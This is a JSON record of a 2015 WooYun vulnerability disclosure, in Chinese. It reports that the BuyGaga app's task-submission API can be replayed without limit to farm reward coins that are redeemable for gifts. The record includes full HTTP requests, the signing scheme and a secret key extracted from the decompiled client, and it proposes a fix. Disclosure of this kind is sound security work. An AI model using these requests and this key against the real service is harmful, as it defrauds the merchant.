{"id": 29562, "wybug_id": "wooyun-2015-0118960", "wybug_title": "买嘎嘎设计缺陷可无限制刷取嘎币", "wybug_corp": "买嘎嘎", "wybug_author": "三石", "wybug_date": "2015-06-09 12:16", "wybug_open_date": "2015-07-24 12:48", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-09：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-07-24：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 买嘎嘎中 嘎币可以换取很多实体礼品而且不需要人民币。 比如60嘎币就能获取一件骆驼牌的冲锋衣，还有很多很多礼品都可以通过嘎币直接换取。 这就相当于可以随意换取礼品。  详细说明：  漏洞对应的业务逻辑：  “我的” - “嘎嘎会员” - “会员任务” - “3.软件分享”任务列表获取接口： 请求：POST //gagaapi/task.php HTTP/1.1Content-Length: 75Content-Type: application/x-www-form-urlencodedHost: www.buygaga.comConnection: Keep-AliveUser-Agent: Mozilla/5.0 (Linux; U; Android 4.4.4; zh-cn; MI NOTE LTE Build/KTU84P) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1Cookie: PHPSESSID=94ndklvi24rc9jpj8gpi1d4j72Cookie2: $Version=1Accept-Encoding: gzipuid=1861168391&method=getmissionstate&sign=fe0fff3f7a545ff03f8b2c133395b2f2http 请求返回：HTTP/1.1 200 OKDate: Mon, 08 Jun 2015 03:24:45 GMTServer: Apache/2.4.10 (Unix) OpenSSL/1.0.1e-fips PHP/5.4.30X-Powered-By: PHP/5.4.30Content-Length: 69Keep-Alive: timeout=5, max=100Connection: Keep-AliveContent-Type: text/html;charset=utf-8{\"code\":200,\"datas\":[{\"sharestate\":\"3\",\"uinfostate\":\"1\"}],\"msg\":null}对应任务截图： \n\n完成任务后有个提交完成的接口：http 请求：POST //gagaapi/task.php HTTP/1.1Content-Length: 82Content-Type: application/x-www-form-urlencodedHost: www.buygaga.comConnection: Keep-AliveUser-Agent: Mozilla/5.0 (Linux; U; Android 4.4.4; zh-cn; MI NOTE LTE Build/KTU84P) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1Cookie: PHPSESSID=94ndklvi24rc9jpj8gpi1d4j72Cookie2: $Version=1Accept-Encoding: gzipuid=1861168391&method=getmissiongabi&mtype=2&sign=9b531cc8f67317785585710387ccfe50参数说明： uid（用户id）  method（请求动作）mtype（分享类型2是短信分享）sign（指纹认证参数） sign 是一个字符串的md5 ， 字符串的组合是 将参数根据每个参数值的 ascii 从小到大排序， 参数集合中增加 一个 “gagabuy123” 秘钥值参与排序， 该秘钥值是反编译客户端从 com.buygaga.appscan.request 包下得 HtPostBodyReq 类 createRequestParams 方法中发现的 。 sign 计算方式举例 比如参数有 ：uid=1861168391&method=getmissiongabi&mtype=2排序后 ：“ 2 1861168391gagabuy123 getmissiongabi  ” （为了说明排序关系才加入的空格 计算时是没有空格的） 将该字符串计算md5 后的值就是  sign 的值( 注意md5 一定要小写，大写的服务器认证不通过，曾经就犯过这个错误)http 返回：HTTP/1.1 200 OKDate: Mon, 08 Jun 2015 03:15:37 GMTServer: Apache/2.4.10 (Unix) OpenSSL/1.0.1e-fips PHP/5.4.30X-Powered-By: PHP/5.4.30Content-Length: 68Keep-Alive: timeout=5, max=100Connection: Keep-AliveContent-Type: text/html;charset=utf-8{\"code\":200,\"datas\":[],\"msg\":\"嘎币领取成功\"}   漏洞证明：  我现在有41个嘎币： \n\n我接下来访问10次任务完成提交 \n\n访问10次后的结果全部正确:\n\n我现在就从41个嘎币变成51个嘎币了。\n\n   修复方案：  服务端 加上任务提交 每天一次的限制即可。    版权声明：转载请注明来源 三石@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}